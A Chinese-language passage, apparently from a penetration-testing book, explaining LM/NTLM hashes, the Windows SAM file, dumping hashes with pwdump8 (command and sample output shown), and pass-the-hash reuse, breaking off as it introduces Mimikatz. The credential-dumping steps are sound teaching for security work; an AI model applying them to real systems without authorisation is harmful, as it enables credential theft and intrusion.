  \ 字符的块进行哈希处理，这使得它很容易破解，因为你可以分别攻击每一块。\n*   如果密码少于 7 个字符，只有前 7 个字符会被哈希，而其他字符串部分将被设置为常量\
  \ `0xAAD3B435B51404EE`。\n\n请注意 Windows 凭据的哈希历史。事实上，LM 哈希曾用于以下系统：\n\n*   Windows\
  \ NT 3.1\n*   Windows NT 3.5\n*   Windows NT 3.51\n*   Windows NT 4\n*   Windows\
  \ 95\n*   Windows 98\n*   Windows 2000\n*   Windows Me\n\n因此，现代操作系统不再使用 LM 哈希。从\
  \ Windows Vista 和 Windows Server 2008 开始，微软默认禁用了 LM 哈希。但可以通过安全策略设置，为本地账户和 Active\
  \ Directory 账户启用该功能。\n\n如今，Windows 操作系统使用 NT Lan Manager (NTLM) v2。你将在下一节中看到这种哈希的样子，但要知道它是\
  \ LM 和 NTLM v1 的改进。这种哈希是在 Windows NT 4 SP4 中引入的，并在 Windows 系统中被原生支持。我们不会深入探讨用于保护此哈希的加密算法，但你应该理解如何执行以下操作：\n\
  \n*   定位哈希文件（称为 SAM 文件）\n*   提取哈希（转储哈希）\n*   破解哈希或重用它们（哈希传递攻击）\n\n### SAM 文件和哈希转储\n\
  \n安全账户管理器 (SAM) 文件是 Windows 系统存储账户哈希的地方。该文件位于 `%SystemRoot%/system32/config/SAM`，并挂载在\
  \ `HKLM/SAM` 上。\n\n遗憾的是，你没有该文件的读取权限（即使你是管理员）。对于我们黑客来说的是，我们有工具可以提取（*dump*）这些哈希。Pwdump\
  \ 是完成此任务的极佳工具。要下载 Pwdump 版本 8，请访问以下位置（支持 Windows 10 的最新版本）：\n\n[http://blackmath.it/pub/pwdump/pwdump8.exe]\n\
  \n```\nC:\\Users\\admin\\Documents>pwdump8.exe\n\nPwDump v8.2 - dumps windows password\
  \ hashes - by Fulvio Zanetti & Andrea Petralia @ http://www.blackMath.it\n\nAdministrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0\n\
  Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0\nDefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0\n\
  admin:1001:AAD3B435B51404EEAAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634 \n\
  ```\n\n根据之前的输出，每个账户的格式如下：\n\n```\n[username]:[userID]:[AAD3B435…404EE]:[NTLM Hash\
  \ Value]\n```\n\n在这一 (SAM) 文件格式中，有两个核心要点需要理解。首先，常量 `AAD3B435…404EE` 总是相同的；它的存在是为了以防用户启用了\
  \ LM 哈希。其次，每个部分都由冒号（`:`）字符分隔。\n\n### 使用哈希\n\n提取哈希后，你有两个选择：\n\n*   使用它登录其他 Windows\
  \ 系统（哈希传递 pass the hash）\n*   破解哈希以获取明文密码（我最喜欢的有效方案）\n\n在接下来的章节中（关于重用密码和哈希的章节），你将学习如何使用提取的哈希远程登录另一个\
  \ Windows 宿主机。在下一章中，你还将学习如何破解哈希，包括 NTLM；请关注！\n\n### Mimikatz\n\nMimikatz 是一把“瑞士军刀”，功能极其全。Mimikatz\
